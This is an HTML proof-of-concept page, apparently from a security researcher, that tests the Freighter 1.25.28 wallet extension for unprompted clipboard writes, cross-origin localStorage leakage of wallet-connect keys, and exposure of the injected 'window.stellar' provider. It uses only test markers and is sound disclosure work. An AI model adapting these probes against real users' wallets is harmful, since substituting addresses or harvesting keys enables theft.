<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Freighter 1.25.28 - Combined POC - 0x403for</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:12px}
h3{color:#ff0;border-bottom:1px solid #333;padding-bottom:4px}
button{width:100%;padding:14px;margin:5px 0;background:#111;color:#0f0;border:1px solid #0f0;text-align:left;font-size:11px}
button.crit{border-color:#f00;color:#ff0}
pre{background:#111;padding:8px;height:300px;overflow:auto;border:1px solid #333;font-size:10px;white-space:pre-wrap;word-break:break-all}
</style>
</head>
<body>
<h2>Freighter 1.25.28 Combined - 0x403for</h2>

<h3>1. [HIGH] Clipboard Write Test</h3>
<button onclick="testClip()">A. Test clipboard.writeText</button>
<button onclick="readClip()">B. Read clipboard</button>

<h3>2. [CRITICAL] Storage Isolation Test</h3>
<button class="crit" onclick="setTest()">C. SET test key wc:test-0x403for</button>
<button class="crit" onclick="listKeys()">D. LIST storage current origin</button>
<button class="crit" onclick="openAqua()">E. OPEN aqua.network new tab</button>
<button class="crit" onclick="checkLeak()">F. CHECK if test key exists in this origin</button>

<h3>3. Provider Dump</h3>
<button onclick="dump()">G. DUMP provider</button>

<pre id="log"></pre>

<script>
const TEST_ADDR = 'TEST_CLIPBOARD_0x403for_POC_123';
const TEST_KEY = 'wc:test-0x403for';
const TEST_VAL = 'poc-0x403for-'+Date.now();

function log(t){
  let el=document.getElementById('log');
  el.innerText+='['+new Date().toLocaleTimeString()+'] '+t+'\n';
  el.scrollTop=el.scrollHeight;
}

async function testClip(){
  log('Testing clipboard.writeText...');
  try{
    await navigator.clipboard.writeText(TEST_ADDR);
    log('SUCCESS - clipboard.writeText allowed: '+TEST_ADDR);
    log('If no prompt shown = HIGH (should require user gesture/prompt)');
  }catch(e){ log('Blocked SECURE: '+e.message); }
}
async function readClip(){
  try{
    let v=await navigator.clipboard.readText();
    log('Clipboard contains: '+v);
  }catch(e){ log('Read blocked: '+e.message); }
}

function setTest(){
  localStorage.setItem(TEST_KEY, TEST_VAL);
  log('SET '+TEST_KEY+' = '+TEST_VAL+' in origin '+location.origin);
}
function listKeys(){
  log('--- Storage in '+location.origin+' ---');
  for(let i=0;i<localStorage.length;i++){
    let k=localStorage.key(i);
    if(k.includes('wc')||k.includes('0x403for')) log('LS '+k+'='+localStorage.getItem(k).substring(0,150));
  }
}
function openAqua(){
  log('Opening aqua.network...');
  window.open('https://aqua.network','_blank');
}
function checkLeak(){
  let v=localStorage.getItem(TEST_KEY);
  log('Check '+TEST_KEY+' in '+location.origin);
  if(v) log('LEAK CONFIRMED CRITICAL: key from other origin readable: '+v);
  else log('NOT FOUND - isolated SECURE');
  listKeys();
}

function dump(){
  log('stellar: '+(window.stellar?Object.keys(window.stellar).join(','):'not found'));
}
log('Ready - Same flow as your video 00:00-00:32');
</script>
</body>
</html>
